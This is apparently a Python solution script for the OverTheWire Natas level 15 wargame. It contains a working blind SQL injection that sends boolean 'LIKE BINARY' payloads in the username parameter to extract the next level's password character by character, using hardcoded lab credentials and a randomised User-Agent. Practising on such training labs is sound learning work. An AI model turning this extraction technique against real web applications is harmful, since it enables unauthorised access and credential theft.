#!/usr/bin/python3.9

"""This script is a solution to Overthewire Natas level 15."""

import string
import requests as r
from requests.auth import HTTPBasicAuth
from fake_useragent import UserAgent

url = "http://natas15.natas.labs.overthewire.org/"

lvl_user = "natas15"
lvl_pass = "TTkaI7AWG4iDERztBcEyKV7kRXH1EZRB"

headers = {
    "User-Agent": UserAgent().random
    }

def get_charlist():
    retrieved=""

    for c in list(string.ascii_letters+string.digits):    
        res = r.get(
            url,
            params={"username": f"natas16\" AND password LIKE BINARY '%{c}%' #"},
            headers=headers, 
            auth=HTTPBasicAuth(lvl_user, lvl_pass))
        
        output = res.text.split("\n")[-5].split("<")[0]

        if(output == "This user exists."):
            retrieved+=c
            print("[CHARLIST]", retrieved)

    print("[CHARLIST] Length:", len(retrieved))
    
    return list(retrieved)

def get_password(charlist):
    retrieved, output = "", ""

    for _ in range(32):
        for c in charlist:   
            res = r.get(
                url,
                params={"username": f"natas16\" AND password LIKE BINARY '{retrieved+c}%' #"},
                headers=headers, 
                auth=HTTPBasicAuth(lvl_user, lvl_pass))

            output = res.text.split("\n")[-5].split("<")[0]

            if(output == "This user exists."):
                retrieved+=c
                print("[RETRIEVED]", retrieved)
                break

    return retrieved

try:
    charlist = get_charlist()
    password = get_password(charlist)
    print("[PASSWORD]", password)
except Exception as e:
    print("[ERROR]", e, "\n")
    exit(-1)
